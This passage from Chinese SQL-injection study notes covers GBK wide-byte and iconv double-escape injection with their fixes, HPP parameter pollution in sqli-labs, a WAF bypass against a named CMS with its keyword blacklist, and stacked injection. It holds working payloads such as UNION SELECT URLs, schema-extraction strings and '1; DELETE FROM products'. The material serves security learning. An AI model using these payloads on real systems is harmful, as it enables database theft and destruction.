&lt;p&gt;这就是 mysql 的特性，因为 &lt;code&gt;gbk&lt;/code&gt;  是多字节编码，他认为两个字节代表一个汉字，所以 &lt;code&gt;%df&lt;/code&gt;  和后面的 &lt;code&gt;addslash&lt;/code&gt;  加的 &lt;code&gt;\&lt;/code&gt;  也就是 &lt;code&gt;%5c&lt;/code&gt;  变成了一个汉字 &lt;code&gt;運&lt;/code&gt; ，而 &lt;code&gt;&#39;&lt;/code&gt;  逃逸了出来。&lt;/p&gt;
&lt;p&gt;因为两个字节代表一个汉字，所以我们可以试试 &lt;code&gt;%df%df%27&lt;/code&gt; ：&lt;/p&gt;
&lt;p&gt;此时不报错了， &lt;code&gt;%df%df&lt;/code&gt;  拼成了一个汉字， &lt;code&gt;%5c%27&lt;/code&gt;  因为 &lt;code&gt;27&lt;/code&gt;  不大于 128，不构成汉字。所以根据这个特性，我们用 &lt;code&gt;1%a1&#39;&lt;/code&gt;  也可以。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;%a1%5c&lt;/code&gt;  他可能不是汉字，但一定会被 mysql 认为是一个宽字符，就能够让后面的 &lt;code&gt;%27&lt;/code&gt;  逃逸了出来。&lt;/p&gt;
&lt;p&gt;但如果我们把 gbk 换成 gb2312，我们的 &lt;code&gt;%df%5c%27&lt;/code&gt;  又不能注入了&lt;/p&gt;
&lt;p&gt;这归结于 gb2312 编码的取值范围。它的高位范围是 &lt;code&gt;0xA1~0xF7&lt;/code&gt; ，低位范围是 &lt;code&gt;0xA1~0xFE&lt;/code&gt; ，而 &lt;code&gt;\&lt;/code&gt;  是 0x5c，是不在低位范围中的。所以， &lt;code&gt;0x5c&lt;/code&gt;  根本不是 gb2312 中的编码，所以自然也是不会被吃掉的。&lt;/p&gt;
&lt;p&gt;为了解决宽字节注入，有些 cms 会用 mysql_real_escape_string 抵御，但如果我们去使用 % df，他依然会被打穿&lt;/p&gt;
&lt;p&gt;原因就是，你没有指定 php 连接 mysql 的字符集。我们需要在执行 sql 语句之前调用一下 mysql_set_charset 函数，设置当前连接的字符集为 gbk。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//修复方案1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mysql_query(&amp;quot;SET NAMES &amp;#x27;gbk&amp;#x27;&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mysql_real_escape_string&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第二个解决方案就是，将 character_set_client 设置为 binary（二进制）。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//修复方案2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//只需在所有sql语句前指定一下连接的形式是二进制：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们将 character_set_client 设置成 binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。&lt;/p&gt;
&lt;p&gt;接下来是双重转义的情况 —iconv 导致的致命后果&lt;/p&gt;
&lt;p&gt;(划重点，好好看，后面 file include 中会考这个函数)&lt;/p&gt;
&lt;p&gt;有些 cms 会使用如下字符集转换函数防止乱码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;iconv(&amp;#x27;utf-8&amp;#x27;, &amp;#x27;gbk&amp;#x27;, $_GET[&amp;#x27;word&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当我们输入 &lt;code&gt;錦&#39;&lt;/code&gt;  时，他又报错了，它的 utf-8 编码是 &lt;code&gt;0xe98ca6&lt;/code&gt; ，它的 gbk 编码是 &lt;code&gt;0xe55c&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当他从 utf8 转成 gbk 时，变成了 &lt;code&gt;%e5%5c%27&lt;/code&gt; ，这时多管闲事的 addslashes 又送来了一个 &lt;code&gt;\&lt;/code&gt; ，变成了 &lt;code&gt;%e5%5c%5c%27&lt;/code&gt; ，两个 5c 形成了双重转义，对 &lt;code&gt;&#39;&lt;/code&gt;  的转义失效，注入产生&lt;/p&gt;
&lt;p&gt;如果我们此时从 gbk 转为 utf8&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;iconv(&amp;#x27;gbk&amp;#x27;, &amp;#x27;utf-8&amp;#x27;, $_GET[&amp;#x27;word&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们再次输入 &lt;code&gt;%aa&#39;&lt;/code&gt; ，注入又发生了，因为从 gbk 转为 utf8 时，php 会两个字节一转换，一旦 &lt;code&gt;\&lt;/code&gt;  前面的字符是奇数， &lt;code&gt;\&lt;/code&gt;  就会被吞掉， &lt;code&gt;&#39;&lt;/code&gt;  逃逸&lt;/p&gt;
&lt;p&gt;那么为什么之前 utf-8 转换成 gbk 的时候，没有使用这个姿势？&lt;/p&gt;
&lt;p&gt;对于多字节的符号，其第 2、3、4 字节的前两位都是 10，也就是说， &lt;code&gt;\&lt;/code&gt; （0x0000005c）不会出现在 utf-8 编码中，所以 utf-8 转换成 gbk 时，如果有 &lt;code&gt;\&lt;/code&gt;  则 php 会报错：&lt;/p&gt;
&lt;p&gt;而 &lt;code&gt;\&lt;/code&gt;  会出现在 gbk 中，所以从 gbk 转为 utf8 会吞掉 \&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vbXV0aWJ5dGUtc3FsLWluamVjdC5odG1s&#34;&gt;浅析白盒审计中的字符编码及 SQL 注入 | 离别歌 (leavesongs.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;sqllab less-32&lt;/p&gt;
&lt;p&gt;注意：使用 post 提交时，不能自动转为 %5c，需要使用 BP 抓包提交&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316223957869.png&#34; alt=&#34;image-20220316223957869&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;hpp参数污染&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hpp参数污染&#34;&gt;#&lt;/a&gt; HPP 参数污染&lt;/h5&gt;
&lt;p&gt;sqllabs less 29:&lt;/p&gt;
&lt;p&gt;在 login.php 中，如果我们尝试闭合会产生报错，这关考点是 hpp 参数污染&lt;/p&gt;
&lt;p&gt;对于当有多个 key 相同的参数时，不同服务器获取参数与情况&lt;/p&gt;
&lt;p&gt;?id=1&amp;amp;id=10&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316200748174.png&#34; alt=&#34;image-20220316200748174&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;php 对于两个相同 key 的参数，取第二个&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因此由于我们的环境是 php+Apache，只会接收第二个参数，我们只需要在第二个参数中注入，第一个参数可以随意提交，但 waf 过滤的却是第一个参数&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1:18888/sqli/Less-29/login.php?id=1&amp;amp;id=-2%27%20union%20select%201,2,3--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h6 id=&#34;通过hppphp绕过贷齐乐waf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#通过hppphp绕过贷齐乐waf&#34;&gt;#&lt;/a&gt; 通过 HPP+PHP 绕过贷齐乐 waf&lt;/h6&gt;
&lt;p&gt;此处的 waf 会经过两层过滤，第一层过滤&lt;/p&gt;
&lt;p&gt;/core/sqlin.inc.php，包含在 config.inc.php 中，所有请求都会经由此类过滤：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;class sqlin &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	function dowith_sql($str) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$check= eregi(&amp;#x27;select|insert|update|delete|\&amp;#x27;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile&amp;#x27;, $str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		if($check)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			echo &amp;quot;非法字符!&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			exit();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第二层过滤&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/* 检查和转义字符 */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function safe_str($str)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(!get_magic_quotes_gpc()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if( is_array($str) ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            foreach($str as $key =&amp;gt; $value) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                $str[$key] = safe_str($value);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $str = addslashes($str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return $str;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function dhtmlspecialchars($string) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(is_array($string)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        foreach($string as $key =&amp;gt; $val) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $string[$key] = dhtmlspecialchars($val);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $string = str_replace(array(&amp;#x27;&amp;amp;&amp;#x27;, &amp;#x27;&amp;quot;&amp;#x27;, &amp;#x27;&amp;lt;&amp;#x27;, &amp;#x27;&amp;gt;&amp;#x27;,&amp;#x27;(&amp;#x27;,&amp;#x27;)&amp;#x27;), array(&amp;#x27;&amp;amp;amp;&amp;#x27;, &amp;#x27;&amp;amp;quot;&amp;#x27;, &amp;#x27;&amp;amp;lt;&amp;#x27;, &amp;#x27;&amp;amp;gt;&amp;#x27;,&amp;#x27;（&amp;#x27;,&amp;#x27;）&amp;#x27;), $string);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if(strpos($string, &amp;#x27;&amp;amp;amp;#&amp;#x27;) !== false) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $string = preg_replace(&amp;#x27;/&amp;amp;amp;((#(\d&amp;#123;3,5&amp;#125;|x[a-fA-F0-9]&amp;#123;4&amp;#125;));)/&amp;#x27;, &amp;#x27;&amp;amp;\\1&amp;#x27;, $string);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return $string;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此该系统对于输入处理的过程如下&lt;/p&gt;
&lt;p&gt;index.php -&amp;gt; config.inc.php -&amp;gt; sqlin.php -&amp;gt; safe.inc.php&lt;/p&gt;
&lt;p&gt;但我在 safe.inc.php 里找到了如下一段代码（在替换之前）：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$request_uri = explode(&amp;quot;?&amp;quot;, $_SERVER[&amp;#x27;REQUEST_URI&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if (isset($request_uri[1])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$rewrite_url = explode(&amp;quot;&amp;amp;&amp;quot;, $request_uri[1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	foreach ($rewrite_url as $key =&amp;gt; $value) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$_value = explode(&amp;quot;=&amp;quot;, $value);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		if (isset($_value[1])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			//$_REQUEST[$_value[0]] = addslashes($_value[1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			//$_REQUEST[$_value[0]] = dhtmlspecialchars($_value[1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;主要内容就是通过 explode 的多次分割，将最后的 key-value 提取出来，在使用 dhtmlspecialchars 做一个转义&lt;/p&gt;
&lt;p&gt;当我们有两个相同参数时，php 是只取后一个的，假设我有一个办法，在第一次 WAF 检测参数的时候，检测的是 2，但后面覆盖 request 的时候，拿到的是 1，那么我们就可以绕过 waf&lt;/p&gt;
&lt;p&gt;但 php 的另一个特性：&lt;/p&gt;
&lt;p&gt;** 对于传入的非法的 $_GET 数组参数名，PHP 会将他们替换成下划线。** 经过 fuzz，有以下这些字符:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;+ . _ [ &amp;#x27; &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也就是说，php 会认为 i_d 和 i.d 是同一个参数&lt;/p&gt;
&lt;p&gt;那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;amp;user.id=22222 ，php 先将 user.id 转换成 user_id，即为 /t.php?user_id=11111&amp;amp;user_id=22222 ，再获取到的 $_REQUEST [‘user_id’] 就是 22222。&lt;/p&gt;
&lt;p&gt;通过 $_SERVER [‘REQUEST_URI’] 方式获得的参数，并不会对参数中的某些特殊字符进行替换。&lt;/p&gt;
&lt;p&gt;因此在\_SERVER\[&#39;REQUEST\_URI&#39;\]中，user\_id和user\.id却是两个完全不同的参数名，那么切割覆盖后，获取的_REQUEST [‘user_id’] 却是 11111。&lt;/p&gt;
&lt;p&gt;如果我们要利用这个特性，那么必须满足几点：&lt;/p&gt;
&lt;p&gt;1. 有注入点&lt;/p&gt;
&lt;p&gt;2. 注入点可控变量需要获取自 $_REQUEST&lt;/p&gt;
&lt;p&gt;3. 变量的名字必须包含下划线&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public static function GetOne($data = array())&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    global $mysql;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $user_id = isset($data[&amp;#x27;user_id&amp;#x27;])?$data[&amp;#x27;user_id&amp;#x27;]:&amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $username = isset($data[&amp;#x27;username&amp;#x27;])?$data[&amp;#x27;username&amp;#x27;]:&amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $password = isset($data[&amp;#x27;password&amp;#x27;])?$data[&amp;#x27;password&amp;#x27;]:&amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $email = isset($data[&amp;#x27;email&amp;#x27;])?$data[&amp;#x27;email&amp;#x27;]:&amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $type_id = isset($data[&amp;#x27;type_id&amp;#x27;])?$data[&amp;#x27;type_id&amp;#x27;]:&amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $sql = &amp;quot;CREATE TABLE IF NOT EXISTS `&amp;#123;user_cache&amp;#125;` (&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         `user_id` int(11) NOT NULL DEFAULT &amp;#x27;0&amp;#x27;)&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $mysql -&amp;gt;db_query($sql);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以上代码满足了上面的三个要求&lt;/p&gt;
&lt;p&gt;最终 payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//由于=被过滤，需要使用like，同时对数据库进行16进制编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?user_id=-1/**/Union/**/SeLect/**/1,flag,3,4/**/from/**/users/**/limit/**/0,1&amp;amp;user.id=11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?user_id=-1/**/Union/**/SeLect/**/1,schema_name from information_schema.schemata,3,4/**/from/**/users/**/limit/**/0,1&amp;amp;user.id=11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;堆叠注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#堆叠注入&#34;&gt;#&lt;/a&gt; 堆叠注入&lt;/h5&gt;
&lt;p&gt;Stacked injections (堆叠注入) 从名词的含义就可以看到应该是一堆 sql 语句 (多条) 一起执行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。&lt;/p&gt;
&lt;p&gt;堆叠注入原理&lt;/p&gt;
&lt;p&gt;在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在；结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products 服务器端生成的 sql 语句为： Select * from products where productid=1;DELETE FROM products 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。&lt;/p&gt;
&lt;p&gt;堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli_multi_query () 函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query () 函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限.&lt;/p&gt;
